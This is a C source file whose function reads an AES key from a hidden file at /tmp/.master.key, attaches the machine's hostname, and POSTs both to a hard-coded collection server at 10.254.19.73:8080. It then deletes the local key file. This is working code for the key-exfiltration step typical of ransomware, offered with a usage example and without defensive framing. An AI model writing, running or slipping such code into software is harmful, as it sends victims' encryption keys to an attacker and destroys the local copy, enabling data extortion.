#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <limits.h>

#ifndef HOST_NAME_MAX
#define HOST_NAME_MAX 256
#endif

/**
 * Reads the AES key from /tmp/.master.key, extracts the base64 value,
 * obtains the hostname, builds a JSON payload, and sends it via HTTP POST.
 *
 * Returns:
 *   0 on success
 *  -1 if key file cannot be opened or read
 *  -2 if AES key extraction fails (empty or not found)
 *  -3 if gethostname() fails
 *  -4 if HTTP response code is not 200
 */
int transmit_key(void) {
    FILE *fp = NULL;
    char *buffer = NULL;
    long file_size;
    size_t bytes_read;
    int ret = 0;

    /* 1. Open and read the key file */
    fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        return -1;
    }

    /* Get file size */
    fseek(fp, 0, SEEK_END);
    file_size = ftell(fp);
    rewind(fp);

    if (file_size <= 0) {
        fclose(fp);
        return -1;
    }

    buffer = (char *)malloc(file_size + 1);
    if (!buffer) {
        fclose(fp);
        return -1;
    }

    bytes_read = fread(buffer, 1, file_size, fp);
    fclose(fp);
    fp = NULL;

    if (bytes_read != (size_t)file_size) {
        free(buffer);
        return -1;
    }
    buffer[file_size] = '\0';

    /* 2. Extract base64 key from JSON */
    const char *key_start = strstr(buffer, "\"aes_key\":\"");
    if (!key_start) {
        free(buffer);
        return -2;
    }
    key_start += 11; /* Advance past '"aes_key":"' */

    const char *key_end = strchr(key_start, '"');
    if (!key_end) {
        free(buffer);
        return -2;
    }

    size_t key_len = key_end - key_start;
    if (key_len == 0) {
        free(buffer);
        return -2;
    }

    char *aes_key = (char *)malloc(key_len + 1);
    if (!aes_key) {
        free(buffer);
        return -2;
    }
    strncpy(aes_key, key_start, key_len);
    aes_key[key_len] = '\0';
    free(buffer);
    buffer = NULL;

    /* 3. Obtain hostname */
    char hostname[HOST_NAME_MAX];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        free(aes_key);
        return -3;
    }
    hostname[sizeof(hostname) - 1] = '\0';

    /* 4. Build JSON payload */
    char payload[4096];
    int payload_len = snprintf(payload, sizeof(payload),
        "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", aes_key, hostname);
    free(aes_key);
    aes_key = NULL;

    if (payload_len < 0 || (size_t)payload_len >= sizeof(payload)) {
        return -4;
    }

    /* 5. Send via libcurl */
    CURL *curl = curl_easy_init();
    if (!curl) {
        return -4;
    }

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (!headers) {
        curl_easy_cleanup(curl);
        return -4;
    }

    curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.73:8080/collect");
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(payload));
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL); /* Discard response body */

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    }

    /* Cleanup curl resources */
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK || http_code != 200) {
        return -4;
    }

    /* 6. Remove key file */
    remove("/tmp/.master.key"); /* Ignore failure, transmission succeeded */

    return 0;
}

/* Example usage */
int main(void) {
    int result = transmit_key();
    if (result == 0) {
        printf("Key transmitted successfully.\n");
    } else {
        printf("Transmission failed with error code: %d\n", result);
    }
    return result;
}